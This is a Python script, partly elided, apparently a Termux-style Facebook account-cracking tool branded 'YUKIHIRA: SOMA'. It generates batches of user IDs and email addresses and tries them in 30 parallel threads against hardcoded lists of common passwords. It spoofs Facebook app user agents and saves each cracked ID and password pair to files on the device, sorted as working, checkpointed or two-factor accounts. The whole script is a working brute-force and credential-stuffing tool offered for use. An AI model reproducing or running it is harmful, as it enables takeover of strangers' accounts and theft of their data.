...
\033[1;32m███     █▄ \033[1;30m     ▄█   ▄█▄ \033[1;92m          ▄█            H
 ...
 \033[1;32m             ▀                                                                                                                                                 
\033[1;37;1m-----------------------------------------------
\t      \033[1;37m\033[1;41m Y U K I H I R A  : S O M A \033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : Rey Estacio
\033[1;37;1m ▶ Facebook : www.facebook.com/reysyyy
\033[1;37;1m ▶ Version   : 1.0
\033[1;37;1m-----------------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
...
def cloning_two():
  ...
  #  print(50*'-')
    ...
    clon_ = input(" [?] Sellect : ")
    if clon_ == "1":
        pas = ["first last",'firstlast','first123','firstganda','first1234','first12345','firstpogi','first','first12345','firstlast12345','firstlast1234','firstlast12345','firstlast@12345','firstlast@1234','firstlast@123','first786','first12','firstfirst','first','pogiko','firstigop']
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
    ...
    os.system("clear")
    print(logo)
    print(' [•] CracYUKI Limit : '+str(len(idx)))
    print(" [•] Be Patience CracYUKI Has Been Started")
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [YUKI-OK] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-YUKI] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/2f.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r {} [YUKI] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AYUKI:     
                        clear()
                        tl = str(len(user))
                        print(' [-] CracYUKI Limit   : \033[1;32m'+tl)
                        print(f'\033[1;37m [-] Choice code   :\033[1;32m '+code)
                        print(f'\033[1;37m [-] Be Patience CracYUKI Has Been Started\033[1;97m')
                        print("--------------------------------------------------")
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','malik123','ali123','alikhan123']
                                AYUKI.submit(rndm,ids,passlist)
                print('\033[1;37m')             
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                l1()
                input(' Press enter to back ')
   #             os.system('python AYUKI.py')
def bd():
                user=[]
                clear()
                ...
                with tred(max_workers=30) as AYUKI:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'firstpogi','firstganda','i love you','iloveyou','ballislife','mlislife']
                                AYUKI.submit(rndm,ids,passlist)
                print('\033[1;37m')
               # l1()
                print(' The process has completed')
...
def gmail():
                ...
                print('\033[1;37m example: rey, aly, yuji, yuki\033[1;97m')
                l1()
                first = input(' Put first name: ')
                l1()
                print('\033[1;37m example: rey, REY, Rey \033[1;97m')
                l1()
                ...
                with tred(max_workers=30) as AYUKI:
                        total = str(len(fo))
                        clear()
                        print(' [-] CracYUKI Limit : \033[1;32m'+total)
                        print("\033[1;37m[-] Be Patience CracYUKI Has Been Started\033[1;37m")
                        l1()
                        for user in fo:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ YUKI ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/YUKIOK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
              ...
              #                          print('\r\r\x1b[38;5;208m [Checkpoint] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YUKI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
